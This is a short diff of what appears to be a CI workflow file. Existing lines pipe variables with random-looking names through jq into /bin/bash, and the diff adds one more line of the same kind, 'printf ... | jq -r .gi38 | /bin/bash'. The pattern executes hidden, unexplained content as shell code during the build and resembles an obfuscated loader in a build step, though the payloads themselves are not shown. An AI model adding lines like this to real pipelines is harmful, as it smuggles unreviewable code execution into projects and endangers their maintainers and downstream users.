@@ -29,6 +29,7 @@ jobs:
           echo $wfg533 | jq -r .omxc72 | /bin/bash
           echo $zpn9 | jq -r .vh37594 | /bin/bash
           echo $fq2473 | jq -r .cojz4 | /bin/bash
+          printf '%s' "$qvh31" | jq -r .gi38 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
